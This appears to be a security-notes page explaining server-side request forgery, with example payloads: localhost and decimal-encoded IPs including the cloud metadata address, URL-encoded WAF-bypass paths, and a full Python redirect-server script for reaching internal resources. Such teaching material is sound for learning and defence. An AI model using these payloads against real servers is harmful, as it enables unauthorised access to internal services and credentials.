---
description: 127.0.0.1
---

# Server-Side Request Forgery

Server-Side Request Forgery (SSRF) is an exploit which makes the server that the website is hosted on do internal requests. The exploitation of the vulnerability allows for inducing of server-side requests to the backend, which can be used to read sensitive internal files or make changes.

## How it Works

For example, suppose that a website has a URL requesting functionality and a hidden directory under the `/admin` directory. The hidden directory has a WAF which prevents external IP addresses from accessing it. We can access the hidden directory using this:

```bash
http://example.com?url=http://127.0.0.1/admin
```

`127.0.0.1` refers to the localhost, which is a **logical IP address** that refers to the computer itself. It's otherwise known as the loopback interface, and all computers have some form of IP address referring to itself.

Generally, websites that parse URL's or send requests to the backend cacn be exploited through modifying of HTTP requests. Alternatively, it involves bypassing WAFs using modified HTTP headers, like `X-Forwarded-For`.

## Exploitation

SSRF has a wide range of payloads.

Using decimal IPs:

```bash
http://2130706433/ = http://127.0.0.1
http://3232235521/ = http://192.168.0.1
http://3232235777/ = http://192.168.1.1
http://2852039166/  = http://169.254.169.254
```

Using URL-encoded text to bypass WAF:

```bash
http://127.0.0.1/%61dmin
http://127.0.0.1/%2561dmin
```

Redirects can be used to bypass a website. How this would work is our machine would use some form of redirect script, which would open a listening port that would receive a HTTP request and redirect it back to the localhost. This can be used to spoof a request, and allow for resources that would not otherwise be accessible to be read:

```bash
python2 redirect.py --port 80 --ip 127.0.0.1 http://example.com/admin
```

```python
#!/usr/bin/env python
"""
Simple HTTP URL redirector
Shreyas Cholia 10/01/2015
usage: redirect.py [-h] [--port PORT] [--ip IP] redirect_url
HTTP redirect server
positional arguments:
  redirect_url
optional arguments:
  -h, --help            show this help message and exit
  --port PORT, -p PORT  port to listen on
  --ip IP, -i IP        host interface to listen on
"""
import SimpleHTTPServer
import SocketServer
import sys
import argparse

def redirect_handler_factory(url):
    """
    Returns a request handler class that redirects to supplied `url`
    """
    class RedirectHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
       def do_GET(self):
           self.send_response(301)
           self.send_header('Location', url)
           self.end_headers()

    return RedirectHandler
           
def main():

    parser = argparse.ArgumentParser(description='HTTP redirect server')

    parser.add_argument('--port', '-p', action="store", type=int, default=80, help='port to listen on')
    parser.add_argument('--ip', '-i', action="store", default="", help='host interface to listen on')
    parser.add_argument('redirect_url', action="store")

    myargs = parser.parse_args()
    
    redirect_url = myargs.redirect_url
    port = myargs.port
    host = myargs.ip

    redirectHandler = redirect_handler_factory(redirect_url)
    
    handler = SocketServer.TCPServer((host, port), redirectHandler)
    print("serving at port %s" % port)
    handler.serve_forever()

if __name__ == "__main__":
    main()
```

